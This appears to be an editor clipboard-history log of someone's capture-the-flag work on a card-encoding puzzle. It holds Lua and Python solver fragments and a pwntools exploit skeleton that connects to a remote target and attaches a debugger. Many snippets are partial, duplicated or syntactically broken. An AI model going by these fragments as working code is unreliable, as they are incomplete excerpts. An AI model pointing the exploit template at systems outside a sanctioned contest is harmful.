	                    not_eliminated = not_eliminated + 1
	                end
	            end
	        end
	    end
	    sorted_comb = copy_table(final_comb)
	    table.sort(sorted_comb)
	    cards_to_return = {}
	    tmp_str = ""
	    for idx_enc = 0, #encoding do
	        tmp_str = tmp_str .. encoding[idx_enc] 
	        pos = encoding[idx_enc]
	        table.insert(cards_to_return, sorted_comb[pos])
	    end
	    tmp = ""
	    for idx_r = 1, #cards_to_return do 
	        tmp = tmp .. cards_to_return[idx_r] .. ","
	    end
	    return(cards_to_return)
	end
	
	function index_of(item, tab)
	    for idx = 1, #tab do
	        if tab[idx] == item then
	            return(idx)
	        end
	    end
	    return -1
	end
	
	Bob1 = function(hand)
	    hand_size = 8
	    total_cards = factorial(hand_size) + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    sorted_hand = copy_table(hand)
	    table.sort(sorted_hand)
	    encoding = ""
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        index = index_of(card, sorted_hand)
	        encoding = encoding .. index
	    end
	    real_pos = perm2val[encoding]
	    eliminated = {}
	    for idx_elim = 1, factorial(hand_size) + (hand_size - 1) do
	        eliminated[idx_elim] = 0
	    end
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        if eliminated[card] == 0 then
	            eliminated[card] = 1
	        else
	            temp_card = card + 1
	            if (temp_card == total_cards + 1) then
	                temp_card = 1
	            end
	            elim = 0
	            while elim == 0 do
	                if eliminated[temp_card] == 0 then
	                    eliminated[temp_card] = 1
	                    elim = 1
	                end
	                temp_card = temp_card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	            end
	        end
	        pos = card + 1
	        if (pos == total_cards + 1) then
	            pos = 1
	        end
	        counter = factorial(hand_size - 1)
	        while counter > 0 do
	            if eliminated[pos] == 0 then
	                eliminated[pos] = 1
	                counter = counter - 1
	            end
	            pos = pos + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	        end
	    end
	    guess = 0
	    pos = 1
	    for idx = 1, #eliminated do
	        elim = eliminated[idx]
	        if elim == 0 then
	            if pos == real_pos then
	                guess = idx
	                break
	            end
	            pos = pos + 1
	        end
	    end
	    return(guess)
	end
	
3dec1e5e925979ff0f8e1d0750be6198|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|1|1|V|lua
	1:25:200419:stegasaurus::1WTNKYQCnRj+VCX3:000001cnE6
012c7e9c9304997a471e72b5e6a9f1cc|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|1|1|V|lua
	1:25:200419:stegasaurus::C/C37K7iwcE1lYS3:000000w8rs
2d259064ad9a001f7ef6d62cc46df84b|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|5|1|V|python
	# Set up pwntools for the correct architecture
	exe = context.binary = ELF('./binary')
4cd0d16c9e44dda4c90159f05e37011b|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|5|1|V|python
	# context.terminal = ['tmux', 'splitw', '-h']
06d2721bb09e45fa040bcbf178f58f86|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|32|13|V|python
	if args.GEF:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	    ''')
	    # pie breakpoint function+118
	
	if args.PWNDBG:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
	    ''')
	    # piebase 0x7f0
b1f06eb0fe30376d7481cee8b973f152|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|21|5|V|python
	    if args.REMOTE:
643ad7637ca40a9fc6fef307496e85d3|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|22|9|V|python
	    else:
	        return local(argv, *a, **kw)
f3903cfb3f407e36c82f0b1c26fdc094|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|30|1|V|python
	# io.sendline(payload)
f74866b42a90fe3d9acfdfb0c2b0aca5|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|29|1|V|python
	print(hashcash)
518d11662652368de101693951c55f3a|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|32|1|V|python
	print(lua)
d91ae6001d25f509faba15157c52d413|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|28|63|v|python
	.split(' ')[2]
cecccb8902719a951b134581dc463038|file:///home/neo/vimwiki/Pwn.wiki|57|1|V|vimwiki
	    `import tty`
3269d30ff0a8f667ed9101716e8be1f6|file:///home/neo/vimwiki/Pwn.wiki|61|1|V|vimwiki
	    `io.send(chr(tty.CEOF))`
e2b9ddf1498f9d2011ac95632a29c3a5|file:///home/neo/CTFs/scripts/pwn/skeleton.py|6|1|V|python
	exe = context.binary = ELF('./binary')
	# context.terminal = ['tmux', 'splitw', '-h']
	context.terminal = ['tmux', 'new-window']
8a8fcaedbd74b80447eaa84527605900|file:///home/neo/CTFs/scripts/pwn/skeleton.py|21|1|V|python
	def start(argv=[], *a, **kw):
	    '''Start the exploit against the target.'''
	    if args.REMOTE:
	        return remote(argv, *a, **kw)
	    else:
	        return local(argv, *a, **kw)
6bc205090a468f3a4872f484b8089808|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|28|1|V|python
	def start(argv=[], *a, **kw):
	    '''Start the exploit against the target.'''
	    return remote(argv, *a, **kw)
d0d5b83b4baf24fa5c32f45ee8db74b5|file:///home/neo/CTFs/plaid2020/stegasaurus/steg.py|43|1|V|python
	while(1):
	    output = io.recvline()
	    print(output)
0ac4703403a46d3d4c53d68a05475513|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|227|23|v|lua
	factorial(hand_size - 1)
868ecf55d6284abbf4eea2f724e5fbfa|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|280|19|v|lua
	factorial(hand_size) 
bed740e1353010f11a5d727eef4dbdbe|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|115|1|V|lua
	function factorial(n)
	    fact = 1
	    for i = n, 1, -1 do
	        fact = fact * i
	    end
	    return fact
	end
f04aeef35050fa76ccbc80a89357ffb3|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|1|1|V|lua
	
	Alice2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 2 ) then
	            pos = i - 1 % max_num
	            if pos == -1 then
	                pos = max_num
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos - 1
	                if pos == -1 then
	                    pos = max_num
	                end
	            end
	            values[pos] = 0
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	Bob2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 0 ) then
	            pos = i + 1 
	            if (pos == max_num + 1) then
	                pos = 1
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos + 1
	                if (pos == max_num + 1) then
	                    pos = 1
	                end
	            end
	            values[pos] = 2
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	left_to_right = 1
	right_to_left = 0
	
	function search_arr(a, n, mobile)
	    for i = 0, n-1 do
	        if (a[i] == mobile) then
	            return(i+1)
	        end
	    end
	end
	
	function get_mobile(a, dir, n)
	    mobile_prev = 0
	    mobile = 0
	    for i = 0, n-1 do
	
	        if(dir[a[i] - 1] == right_to_left and i ~= 0) then
	            if(a[i] > a[i-1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	        if(dir[a[i]-1] == left_to_right and i ~= n-1) then
	            if(a[i] > a[i+1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	    end
	    if (mobile == 0 and mobile_prev == 0) then
	        return(0)
	    else
	        return(mobile)
	    end
	
	end
	
	function do_one_perm(a, dir, n)
	    mobile = get_mobile(a, dir, n)
	    pos = search_arr(a, n, mobile)
	
	    if (dir[a[pos - 1] - 1] == right_to_left) then
	        a[pos - 1], a[pos - 2] = a[pos - 2], a[pos - 1]
	    elseif(dir[a[pos - 1] - 1] == left_to_right) then
	        a[pos], a[pos - 1] = a[pos - 1], a[pos]
	    end
	
	    for i = 0, n-1 do
	        if (a[i] > mobile) then
	            if (dir[a[i] - 1] == left_to_right) then
	                dir[a[i] - 1] = right_to_left
	            elseif (dir[a[i] - 1] == right_to_left) then
	                dir[a[i] - 1] = left_to_right
	            end
	        end
	    end
	
	    num_str = ""
	    num = {}
	    for i =0, n-1 do
	        num_str = num_str .. a[i]
	        num[i] = a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	end
	
	function permutations(n)
	    a = {}
	    dir = {}
	
	    num = {}
	    num_str = ""
	    for i = 0, n-1 do
	        a[i] = i+1
	        num[i] = i+1
	        num_str = num_str .. a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	
	    for i = 0, n-1 do
	        dir[i] = right_to_left
	    end
	
	    for i = 1, 5040 - 1 do
	        do_one_perm(a, dir, n)
	    end
	
	end
	
	function combinations(arr)
	    ret_array = {}
	    for i = 1, #arr do
	        local temp = {}
	        for j = 1, #arr do
	            if i ~= j then
	                table.insert(temp, arr[j]) 
	            end
	        end
	        table.insert(ret_array, temp)
	    end
	    return(ret_array)
	end
	
	function card_in_set(card, set)
	    for idx = 1, #set do
	        if set[idx] == card then
	            return(1)
	        end
	    end
	    return(0)
	end
	
	function copy_table(tab)
	    copied = {}
	    for idx = 1, #tab do
	        copied[idx] = tab[idx]
	    end
	    return(copied)
	end
	
	Alice1 = function(hand)
	    hand_size = 8
	    total_cards = 40320 + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    final_choice = 0
	    final_comb = {}
	    local chosen = 0
	    combs = combinations(hand)
	    for comb_idx = 1, #combs do
	        comb = combs[comb_idx]
	        eliminated = {}
	        for i = 1, total_cards do
	            table.insert(eliminated, 0)
	        end
	        for card_idx = 1, #hand do
	            card = hand[card_idx]
	            if card_in_set(card, comb) == 0 then
	                chosen = card
	            end
	        end
	        for card_idx = 1, #comb do
	            card = comb[card_idx]
	            if eliminated[card] == 0 then
	                eliminated[card] = 1
	            else 
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] = 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
	                end
	            end
	            pos = card + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	            counter = 5040
	            while counter > 0 do
	                if eliminated[pos] == 0 then
	                    eliminated[pos] = 1
	                    counter = counter - 1
	                end
	                pos = pos + 1
	                if (pos == total_cards + 1) then
	                    pos = 1
	                end
	            end
	        end
	        if eliminated[chosen] == 0 then
	            final_choice = chosen
	            final_comb = comb
	            not_eliminated = 1
	            for idx = 1, #eliminated do
	                if(eliminated[idx] == 0) then
	                    if (idx == final_choice) then
	                        encoding = val2perm[not_eliminated]
	                    end
	                    not_eliminated = not_eliminated + 1
	                end
	            end
	        end
	    end
	    sorted_comb = copy_table(final_comb)
	    table.sort(sorted_comb)
	    cards_to_return = {}
	    tmp_str = ""
	    for idx_enc = 0, #encoding do
	        tmp_str = tmp_str .. encoding[idx_enc] 
	        pos = encoding[idx_enc]
	        table.insert(cards_to_return, sorted_comb[pos])
	    end
	    tmp = ""
	    for idx_r = 1, #cards_to_return do 
	        tmp = tmp .. cards_to_return[idx_r] .. ","
	    end
	    return(cards_to_return)
	end
	
	function index_of(item, tab)
	    for idx = 1, #tab do
	        if tab[idx] == item then
	            return(idx)
	        end
	    end
	    return -1
	end
	
	Bob1 = function(hand)
	    hand_size = 8
	    total_cards = 40320 + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
	    sorted_hand = copy_table(hand)
	    table.sort(sorted_hand)
	    encoding = ""
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        index = index_of(card, sorted_hand)
	        encoding = encoding .. index
	    end
	    real_pos = perm2val[encoding]
	    eliminated = {}
	    for idx_elim = 1, 40320 + (hand_size - 1) do
	        eliminated[idx_elim] = 0
	    end
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        if eliminated[card] == 0 then
	            eliminated[card] = 1
	        else
	            temp_card = card + 1
	            if (temp_card == total_cards + 1) then
	                temp_card = 1
	            end
	            elim = 0
	            while elim == 0 do
	                if eliminated[temp_card] == 0 then
	                    eliminated[temp_card] = 1
	                    elim = 1
	                end
	                temp_card = temp_card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	            end
	        end
	        pos = card + 1
	        if (pos == total_cards + 1) then
	            pos = 1
	        end
	        counter = 5040
	        while counter > 0 do
	            if eliminated[pos] == 0 then
	                eliminated[pos] = 1
	                counter = counter - 1
	            end
	            pos = pos + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	        end
	    end
	    guess = 0
	    pos = 1
	    for idx = 1, #eliminated do
	        elim = eliminated[idx]
	        if elim == 0 then
	            if pos == real_pos then
	                guess = idx
	                break
	            end
	            pos = pos + 1
	        end
	    end
	    return(guess)
	end
	
8feb97a26767783f28a499d9a6b27fdf|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|184|9|V|c
	        printf("%d\n", i);
c1a7a19405254faf9ea3852d37dcfa2e|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|173|1|V|lua
	    hand_size = 8
	    total_cards = 40320 + (hand_size - 1)
	    val2perm = {}
	    perm2val = {}
	    count = 1
	    permutations(hand_size - 1)
437073f7fe976209fc13074791f7e4f4|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|180|9|V|lua
	        for i = 1, total_cards do
	            table.insert(eliminated, 0)
ccb7a295cdb383d71d35096a018613fb|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|190|17|V|lua
	                table.insert(eliminated, card, 1)
	            end
eefd1f15b004c99137755a9346984210|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|191|15|V|lua
	            end
	            if eliminated[card] == 0 then
b63e23109176e85338c8443ffdaedeed|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|191|17|V|lua
	                eliminated[card] = 1
0e1166d03ebbedd728149e5eff3640bf|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|204|1|V|lua
	            temp_card
36b4554ed1e2433a54a6cff19c1e173f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|203|1|V|lua
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
f7c6b4a7623e42b78059a4aed6eb2ac6|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|195|17|V|lua
	                table.insert(eliminated, card, 1)
9dc2376144cc437b0fa91daf30a29ff8|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|197|1|V|lua
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                en
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] = 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
df0dcab7348e4a3f40bf9e7524a38522|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|197|1|V|lua
	                temp_card = card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                en
	                elim = 0
	                while elim == 0 do
	                    if eliminated[temp_card] == 0 then
	                        eliminated[temp_card] = 1
	                        elim = 1
	                    end
	                    temp_card = temp_card + 1
	                    if (temp_card == total_cards + 1) then
	                        temp_card = 1
	                    end
	                end
	            end
a9498911364a41101a031d263d07decb|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|209|21|V|lua
	                pos = pos + 1
	                if (pos == total_cards + 1) then
	                    pos = 1
	                end
b32096c419b0798a025ea28e71d1df2a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|211|1|V|lua
	                if eliminated[pos] == 0 then
	                    eliminated[pos] = 1
	                    counter = counter - 1
	                end
7461c354064452c6cc3c7f93b3820750|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|213|9|V|lua
	        end
4e7fdc4f0d7b11eddf31c26c1dc2df1e|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|197|13|V|lua
	            table.insert(eliminated, card, 1)
498cc0bbd1be64c114620efd124aa203|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|210|17|V|lua
	                table.insert(eliminated, pos, 1)
9074b6f610671bbf81363084fb37403f|file:///home/neo/CTFs/plaid2020/stegasaurus/code.lua|371|1|V|lua
	-- test_hand = {[1] = 29505, [2] = 1389, [3] = 34274, [4] = 40285, [5] = 8434, [6] = 5097, [7] = 9376, [8] = 27915}
	-- test_hand = {[1] = 36, [2] = 88, [3] = 55, [4] = 103, [5] = 34}
	-- returned = Alice1(test_hand)
	-- guess = Bob1(returned)
	-- print(guess)
ebf675a4ce2398cc743e492ae52a8eda|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|326|1|V|lua
	-- test_hand = {[1] = 36, [2] = 88, [3] = 55, [4] = 103, [5] = 34}
630fab2208fd7535c22fcb15131a3b0a|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|19|1|V|python
	    final_comb = tuple()
	    for comb in itertools.combinations(hand, hand_size - 1):
	        # print(comb)
	        eliminated = [False] * total_cards
	        for card in hand:
	            if card not in comb:
	                chosen = card
	        for card in comb:
	            if eliminated[card] == False:
	                eliminated[card] = True
	            else:
	                temp_card = (card + 1) % total_cards
	                elim = False
	                while not elim:
	                    if eliminated[temp_card] == False:
	                        eliminated[temp_card] = True
	                        elim = True
	                    temp_card = (temp_card + 1) % total_cards
	
	            pos = (card + 1) % total_cards
	            counter = math.factorial(hand_size - 1)
	            while counter > 0:
	                if eliminated[pos] == False:
	                    eliminated[pos] = True
	                    counter = counter - 1
	                pos = (pos + 1) % total_cards
	
	        # elim_str = ""
	        # for elim in eliminated:
	        #     elim_str = elim_str + str(elim) + " "
	        # print(elim_str)
	        if eliminated[chosen] == False:
	            final_choice = chosen
	            final_comb = comb
	            print("Alice's choice: ", final_choice)
	            not_eliminated = 1
	            for idx,elim in enumerate(eliminated):
	                if elim == False:
	                    if (idx == final_choice):
	                        encoding = val2perm[not_eliminated]
	                        print("Tratrafe2 encoding:", encoding)
	                    not_eliminated += 1
	            # print(not_eliminated)
	
	    sorted_comb = sorted(final_comb)
	    cards_to_return = []
	    for pos in str(encoding):
	        cards_to_return.append(sorted_comb[int(pos) - 1])
	    
6159755fd2c9ab74a44e40604e075af0|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|18|5|V|python
	    final_choice = 0
62068510f59fbd6cd5b9f400de6bc2d0|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|63|1|V|python
	    sorted_comb = sorted(final_comb)
	    cards_to_return = []
	    for pos in str(encoding):
	        cards_to_return.append(sorted_comb[int(pos) - 1])
	    
253bfa7b28e5d631f3a6b4627daf85d3|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|23|5|V|python
	    # print("Returned hand:", cards_to_return)
	    # return final_choice, cards_to_return
8416ec58cfd59ba98e6ce6770d57a621|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|25|5|V|python
	    for pos in str(encoding):
5131058c9fe6d403c85093c61ced4fc3|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|25|9|V|python
	        cards_to_return.append(sorted_comb[int(pos) - 1])
2376e090e0dd8a964bead8f3b7a80bf7|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|25|5|V|python
	    print("Returned hand:", cards_to_return)
a0f5f20c83be1b436f47d372d3fd3ae2|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|24|5|V|python
	    cards_to_return = []
afa1d8bea99622f2a11cac6d27d4200d|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|25|29|v|python
	cards_to_return
6da51a7de62b3a4e100db77956476e09|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|23|5|V|python
	    sorted_comb = sorted(final_comb)
e3b05e1828149bb07da0a9394cb9eb8c|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|19|1|V|python
	    for card in hand:
	        total += card
a2518972f63c024bcb6063800deff18c|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|25|5|V|python
	    code = 1
0eae3de66925d3df66a0d010bdd247fc|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|40|5|V|python
	    encoding = val2perm[choice_reduced]
8463957f095f0b146a738412e2712070|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|40|5|V|python
	    choice_reduced = reduced[final_choice]
bcd09b3f4d7c92ab6fe10427f668d4f2|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|38|41|v|python
	choice_reduced
1ee163e8a1c875bb812cd34d7abeafe0|file:///home/neo/CTFs/plaid2020/stegasaurus/new_poc.py|40|26|v|python
	final_comb
c41b5a230e2cdcebf447043a141776b8|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|64|1|V|python
	    cards_to_return = []
	    for pos in str(encoding):
	        cards_to_return.append(sorted_comb[int(pos) - 1])
ea2867e79cd9897348ef9c8a1735be7a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|330|1|V|lua
	test_hand = {[1] = 29505, [2] = 1389, [3] = 34274, [4] = 40285, [5] = 8434, [6] = 5097, [7] = 9376, [8] = 27915}
	returned = Alice1(test_hand)
	guess = Bob1(returned)
	print(guess)
662f707d5491e9bce8238a6c0be92190|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|177|5|v|lua
	hidden
8ff444cc50f466357cfcb95357f0d95c|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|348|1|V|lua
	cards = {}
	for i = 0, total_cards - 1 do
	    cards[i] = i
	end
d24a10527c3ac2cf3783ac766aff423a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|212|1|V|lua
	
	
	
	
	    final_choice = 0
	    final_comb = {}
	    local chosen = 0
	    combs = combinations(hand)
	    for comb_idx = 1, #combs do
	        comb = combs[comb_idx]
	        eliminated = {}
	        end
	        for card_idx = 1, #hand do
	            card = hand[card_idx]
	            if card_in_set(card, comb) == 0 then
	                chosen = card
	            end
	        end
	        for card_idx = 1, #comb do
	            card = comb[card_idx]
	            temp_card = card
	            while eliminated[temp_card] ~= nil do
	                temp_card = temp_card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	            end
	            eliminated[card] = 1
	            pos = card + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	            counter = 5040
	            while counter > 0 do
	                while eliminated[pos] ~= nil do
	                    pos = pos + 1
	                    if (pos == total_cards + 1) then
	                        pos = 1
	                    end
	                end
	                eliminated[pos] = 1
	                counter = counter - 1
	            end
	        if eliminated[chosen] == nil then
	            final_choice = chosen
	            print(final_choice)
	            final_comb = comb
	            not_eliminated = 1
	            for idx = 1, #eliminated do
	                if(eliminated[idx] == nil) then
	                    if (idx == final_choice) then
	                        encoding = val2perm[not_eliminated]
	                    end
	                    not_eliminated = not_eliminated + 1
	                end
	            end
	            break
	        end
	    end
	    sorted_comb = copy_table(final_comb)
	    table.sort(sorted_comb)
	    cards_to_return = {}
	    tmp_str = ""
	    for idx_enc = 0, #encoding do
	        tmp_str = tmp_str .. encoding[idx_enc] 
	        pos = encoding[idx_enc]
	        table.insert(cards_to_return, sorted_comb[pos])
	    end
	    tmp = ""
	    for idx_r = 1, #cards_to_return do 
	        tmp = tmp .. cards_to_return[idx_r] .. ","
	    end
a17cf1189d3261b621c8e894ac1099cd|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|212|1|V|lua
	
	
	
	
	    final_choice = 0
	    final_comb = {}
	    local chosen = 0
	    combs = combinations(hand)
	    for comb_idx = 1, #combs do
	        comb = combs[comb_idx]
	        eliminated = {}
	        end
	        for card_idx = 1, #hand do
	            card = hand[card_idx]
	            if card_in_set(card, comb) == 0 then
	                chosen = card
	            end
	        end
	        for card_idx = 1, #comb do
	            card = comb[card_idx]
	            temp_card = card
	            while eliminated[temp_card] ~= nil do
	                temp_card = temp_card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	            end
	            eliminated[card] = 1
	            pos = card + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	            counter = 5040
	            while counter > 0 do
	                while eliminated[pos] ~= nil do
	                    pos = pos + 1
	                    if (pos == total_cards + 1) then
	                        pos = 1
	                    end
	                end
	                eliminated[pos] = 1
	                counter = counter - 1
	            end
	        if eliminated[chosen] == nil then
	            final_choice = chosen
	            print(final_choice)
	            final_comb = comb
	            not_eliminated = 1
	            for idx = 1, #eliminated do
	                if(eliminated[idx] == nil) then
	                    if (idx == final_choice) then
	                        encoding = val2perm[not_eliminated]
	                    end
	                    not_eliminated = not_eliminated + 1
	                end
	            end
	            break
	        end
	    end
7b113434bd9bb954631fe5e15d55306e|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|223|37|V|lua
	    for idx_r = 1, #cards_to_return do 
	        tmp = tmp .. cards_to_return[idx_r] .. ","
	    end
5473fa03f61705deac914590e6d44f0f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|222|5|V|lua
	    tmp = ""
5beea1c89cf75ccec33d378c6262e024|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|184|1|V|lua
	    new_sum = 0
	    for idx = 1, #revealed do
	        new_sum = new_sum + revealed[idx]
	    end
	    hidden_mod = -new_sum % hand_size
4a0050a7938632f91d893eb3feec4e80|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|190|1|V|lua
	    hidden_subset = {}
	    for c = 0, total_cards - 1 do
	        if card_in_comb(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
	    
	    candidate_cards = {}
	    for idx_hidden = 1, #hidden do
	        c = hidden[idx_hidden]
	        idx = idx_hidden - 1
	        if idx % hand_size == hidden_mod then
	            table.insert(candidate_cards, c)
	        end
	    end
6d6c2795ef3c20bcd8c5900afb03e614|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|266|1|V|lua
	    eliminated = {}
	    for idx_elim = 1, 40320 + (hand_size - 1) do
	        eliminated[idx_elim] = 0
	    end
	    for idx_card = 1, #hand do
	        card = hand[idx_card]
	        if eliminated[card] == 0 then
	            eliminated[card] = 1
	        else
	            temp_card = card + 1
	            if (temp_card == total_cards + 1) then
	                temp_card = 1
	            end
	            elim = 0
	            while elim == 0 do
	                if eliminated[temp_card] == 0 then
	                    eliminated[temp_card] = 1
	                    elim = 1
	                end
	                temp_card = temp_card + 1
	                if (temp_card == total_cards + 1) then
	                    temp_card = 1
	                end
	            end
	        end
	        pos = card + 1
	        if (pos == total_cards + 1) then
	            pos = 1
	        end
	        counter = 5040
	        while counter > 0 do
	            if eliminated[pos] == 0 then
	                eliminated[pos] = 1
	                counter = counter - 1
	            end
	            pos = pos + 1
	            if (pos == total_cards + 1) then
	                pos = 1
	            end
	        end
	    end
	    guess = 0
	    pos = 1
	    for idx = 1, #eliminated do
	        elim = eliminated[idx]
	        if elim == 0 then
	            if pos == real_pos then
	                guess = idx
	                break
	            end
	            pos = pos + 1
	        end
	    end
1a61c79893264c43d5f6067797932871|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|177|5|V|lua
	    print(sum)
8bcaf2b5842db9d6920a973dbf285262|file:///home/neo/CTFs/plaid2020/stegasaurus/poc_combs.py|124|12|v|python
	[29505, 1389, 34274, 40285, 8434, 5097, 9376, 27915]
40d34f7d89b4293925cd06ba25fd9971|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|184|13|V|lua
	            print(hand[idx])
60cc24665708eac3cc1caf3f7670ceee|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|186|13|V|lua
	            revealed[idx] = 
c2b591d525d50b5a8fcf979f81f7cc5a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|186|13|V|lua
	            print(revealed[idx])
0c04fa932cb4c9e9190f04e33bad7ed7|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|183|9|V|lua
	        print(hand[idx])
000298cab9f2cb7a9b951c6822b73beb|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|198|5|V|lua
	    print(hidden_mod)
8d2f138acebc90e9db4be2d023fd98b8|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|187|1|V|lua
	    -- tmp = ""
	    -- for idx = 1, #revealed do
	    --     tmp = tmp .. revealed[idx] .. ","
	    -- end
	    -- print(tmp)
29a8fdd8696d7b677a37f8957897d3ff|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|201|19|v|lua
	revealed
4c4ed296ca655f45389958fef71a4b6b|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|200|13|V|lua
	    -- tmp = ""
	    -- for idx = 1, #hidden_subset do
	    --     tmp = tmp .. hidden_subset[idx] .. ","
	    -- end
	    -- print(tmp)
203f917c1f010282eedee6fa7e0aad75|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|215|5|V|lua
	    --
2854a36536ec7155dec4b32550ef0cf3|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|211|19|v|lua
	hidden_subset
0b6f3c78f96972927668c27d6b92eaa8|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|210|1|V|lua
	    tmp = ""
